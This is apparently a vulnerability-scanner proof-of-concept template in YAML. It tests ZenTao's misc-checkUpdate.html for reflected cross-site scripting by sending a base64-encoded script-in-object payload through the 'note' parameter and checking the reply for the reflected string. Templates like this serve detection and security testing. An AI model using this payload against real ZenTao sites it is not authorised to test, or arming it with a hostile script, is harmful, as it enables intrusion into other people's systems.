name: poc-yaml-zentao-misc-checkupdate-html-xss
binding: c8f6b519-e264-46be-a01e-d44af78ed00d
detail:
    author: 0xxk01
    links:
        - https://www.modb.pro/db/533896
transport: http
set:
    s1: randomLowercase(3)
    s2: '''<script>alert("'' + s1 + ''")</script>'''
    s3: base64(s2)
    s4: '''<object data="data:text/html;base64,'' + s3 + ''">'''
    payload: base64(s4)
rules:
    r0:
        request:
            method: GET
            path: /zentao/misc-checkUpdate.html?note={{payload}}
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes(s3))
    r1:
        request:
            method: GET
            path: /misc-checkUpdate.html?note={{payload}}
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes(s3))
expression: r0() || r1()
